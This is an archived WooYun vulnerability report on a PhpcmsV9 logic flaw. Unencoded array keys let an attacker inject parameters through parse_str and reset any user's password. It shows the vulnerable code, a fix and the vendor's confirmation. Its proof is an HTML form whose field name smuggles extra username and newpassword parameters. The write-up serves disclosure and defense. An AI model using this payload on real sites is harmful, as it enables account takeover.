@@ -1,0 +1,366 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PhpcmsV9 任意用户密码修改逻辑漏洞 2013年贺岁第三发  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PhpcmsV9 任意用户密码修改逻辑漏洞 2013年贺岁第三发  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/我想拿个shell">我想拿个shell</a> 
+</li><li>提交时间：		2013-01-09 11:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-29：	细节向普通白帽子公开<br/>
+									2013-02-08：	细节向实习白帽子公开<br/>
+									2013-02-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于某处的实现机制没有考虑到某个条件，导致了一个任意用户密码重置漏洞。<br />
+<br />
+建议漏洞危害设置为高。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">其实我在发第一个漏洞的时候，就看到了<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-016984">WooYun: PhpcmsV9 SQL注射 2013年贺岁第一发</a> <br />
+<br />
+提到的通行证的代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>parse_str(sys_auth($_POST[&#039;data&#039;], &#039;DECODE&#039;, $this-&gt;applist[$this-&gt;appid][&#039;authkey&#039;]), $this-&gt;data);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在phpsso_server/phpcms/modules/phpsso/classes/phpsso.class.php中。<br />
+<br />
+<br />
+<br />
+我把它留给了你们。<br />
+<br />
+不知道你们发现了它没有。<br />
+<br />
+<br />
+<br />
+我们知道parse_str类似将http请求转换成php变量的函数，所以，也像http请求在php的环境下一样，如果提交?a=sss&amp;a=aaa，那么a的结果会是aaa，不是sss。<br />
+<br />
+<br />
+<br />
+所以我们知道这个函数有一个问题了，如果后面提交一个内容，它会覆盖前面的。<br />
+<br />
+<br />
+<br />
+也就是<br />
+<br />
+<br />
+<br />
+username=zhangsan&amp;username=lisi的话，那么用户名就不是zhangsan了。<br />
+<br />
+<br />
+<br />
+要构造这样的请求，我们还是要回到通行证的client看看，我们有没有这样的机会。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+其实我们有这样的机会，看看代码，如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function auth_data($data) {<br />
+		$s = $sep = &#039;&#039;;<br />
+		foreach($data as $k =&gt; $v) {<br />
+			if(is_array($v)) {<br />
+				$s2 = $sep2 = &#039;&#039;;<br />
+				foreach($v as $k2 =&gt; $v2) {<br />
+						$s2 .= &quot;$sep2{$k}[$k2]=&quot;.$this-&gt;_ps_stripslashes($v2);<br />
+					$sep2 = &#039;&amp;&#039;;<br />
+				}<br />
+				$s .= $sep.$s2;<br />
+			} else {<br />
+				$s .= &quot;$sep$k=&quot;.$this-&gt;_ps_stripslashes($v);<br />
+			}<br />
+			$sep = &#039;&amp;&#039;;<br />
+		}<br />
+<br />
+		$auth_s = &#039;v=&#039;.$this-&gt;ps_vsersion.&#039;&amp;appid=&#039;.APPID.&#039;&amp;data=&#039;.urlencode($this-&gt;sys_auth($s));<br />
+		return $auth_s;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可能我没说明白，对，传递进来的数组的key是可控的。如果我的key里包含[]&amp;这样三个字符的话，那么我就能重写这样的东西。<br />
+<br />
+<br />
+<br />
+举个例子<br />
+<br />
+<br />
+<br />
+$a[aaa=a&amp;bbb] = &#039;a&#039;;<br />
+<br />
+<br />
+<br />
+会变成aaa=a&amp;bbb=a<br />
+<br />
+<br />
+<br />
+明白了么，对，就是通过没有注意到的key，我们可以构造出多余的参数来。<br />
+<br />
+<br />
+<br />
+这个时候，我们可以再去看一个函数。<br />
+<br />
+<br />
+<br />
+就在这个文件内：<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function ps_member_edit($username, $email, $password=&#039;&#039;, $newpassword=&#039;&#039;, $uid=&#039;&#039;, $random=&#039;&#039;) {<br />
+		if($email &amp;&amp; !$this-&gt;_is_email($email)) {<br />
+			return -4;<br />
+		}<br />
+		return $this-&gt;_ps_send(&#039;edit&#039;, array(&#039;username&#039;=&gt;$username, &#039;password&#039;=&gt;$password, &#039;newpassword&#039;=&gt;$newpassword, &#039;email&#039;=&gt;$email, &#039;uid&#039;=&gt;$uid, &#039;random&#039;=&gt;$random));<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这是向通行证发了这样一个请求。<br />
+<br />
+<br />
+<br />
+我们再跟到通信证代码里去看看，就会有所发现。<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function edit() {<br />
+//能省就省，太长了不是吗？<br />
+<br />
+if($this-&gt;username) {<br />
+//如果提交了用户名，则按照用户名修改记录，反之，按照uid来修改记录。<br />
+				$res = $this-&gt;db-&gt;update($data, array(&#039;username&#039;=&gt;$this-&gt;username));<br />
+			} else {<br />
+				file_put_contents(&#039;typeb.txt&#039;,print_r($data,1).$this-&gt;uid);<br />
+				$res = $this-&gt;db-&gt;update($data, array(&#039;uid&#039;=&gt;$this-&gt;uid));<br />
+			}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+好，我们知道了，如果提交了用户名，就会按照用户名来修改记录，不然就按照uid，我们看看函数结构：<br />
+<br />
+<br />
+<br />
+public function ps_member_edit($username, $email, $password=&#039;&#039;, $newpassword=&#039;&#039;, $uid=&#039;&#039;, $random=&#039;&#039;)<br />
+<br />
+<br />
+<br />
+很好，uid要是无法控制的话，后面只剩下一个random了，但是username就在第一个，只要email，password，newpassword，有任何一个可以控制，就可以修改密码了。<br />
+<br />
+<br />
+<br />
+我当然找到了：<br />
+<br />
+phpcms9/phpcms/modules/member/index.php<br />
+<br />
+</p><pre><code>$res = $this-&gt;client-&gt;ps_member_edit(&#039;&#039;, $email, $_POST[&#039;info&#039;][&#039;password&#039;], $_POST[&#039;info&#039;][&#039;newpassword&#039;], $this-&gt;memberinfo[&#039;phpssouid&#039;], $this-&gt;memberinfo[&#039;encrypt&#039;]);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后就没有然后了。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">我还是给个视频说明吧。<br />
+<br />
+<br />
+<br />
+<embed src="http://player.youku.com/player.php/sid/XNDk5NTMyMzY4/v.swf" type="application/x-shockwave-flash" allowscriptaccess="never" allowfullscreen="true" wmode="opaque" width="480" height="370"></embed><br />
+<br />
+密码：nicai<br />
+<br />
+<br />
+<br />
+第四分钟后就别看了，我从虚拟机切出来时我电脑卡了。<br />
+<br />
+<br />
+<br />
+此次用到的表单如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;form method=&quot;post&quot; action=&quot;http://localhost/phpcms9/index.php?m=member&amp;c=index&amp;a=account_manage_password&amp;t=1&quot; id=&quot;myform&quot; name=&quot;myform&quot;&gt;<br />
+				&lt;table width=&quot;100%&quot; cellspacing=&quot;0&quot; class=&quot;table_form&quot;&gt;<br />
+					&lt;tr&gt;<br />
+						&lt;th width=&quot;80&quot;&gt;邮箱：&lt;/th&gt;        <br />
+						&lt;td&gt;&lt;input name=&quot;info[email]&quot; type=&quot;text&quot; id=&quot;email&quot; size=&quot;30&quot; value=&quot;jj@jj.com&quot; class=&quot;input-text&quot;&gt;&lt;/td&gt;<br />
+					&lt;/tr&gt;<br />
+					&lt;tr&gt;<br />
+						&lt;th width=&quot;80&quot;&gt;原密码：&lt;/th&gt;        <br />
+						&lt;td&gt;&lt;input name=&quot;info[password]&quot; type=&quot;password&quot; id=&quot;password&quot; size=&quot;30&quot; value=&quot;111111&quot; class=&quot;input-text&quot;&gt;&lt;/td&gt;<br />
+					&lt;/tr&gt;<br />
+					&lt;tr&gt;<br />
+						&lt;th&gt;新密码：&lt;/th&gt;<br />
+						&lt;td&gt;&lt;input name=&quot;info[newpassword][%5D=aaa%5D%5B&amp;username=cc&amp;newpassword=aaaaaa&amp;]&quot; type=&quot;password&quot; id=&quot;newpassword&quot; size=&quot;30&quot; value=&quot;&quot; class=&quot;input-text&quot;&gt;&lt;/td&gt;<br />
+					&lt;/tr&gt;<br />
+					&lt;th&gt;&lt;/th&gt;<br />
+					&lt;td&gt;&lt;input name=&quot;dosubmit&quot; type=&quot;submit&quot; id=&quot;dosubmit&quot; value=&quot;提交&quot; class=&quot;button&quot;&gt;&lt;/td&gt;<br />
+					&lt;/tr&gt;<br />
+				&lt;/table&gt;<br />
+<br />
+				<br />
+			&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">urlencode那个key和value<br />
+<br />
+<br />
+<br />
+话说，你看看，每次都是这么精彩的分析，这么能说明问题的漏洞，这样好的证明以及实际可用的解决方案，为啥会拿和那种无聊xss一样的rank值呢？<br />
+<br />
+<br />
+<br />
+要有审美观。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/我想拿个shell" title="我想拿个shell">我想拿个shell</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017119" title="PhpcmsV9 任意用户密码修改逻辑漏洞 2013年贺岁第三发">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2013-01-09 13:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢，请联系我们官网客服，留下你的联系方式！！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17119";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
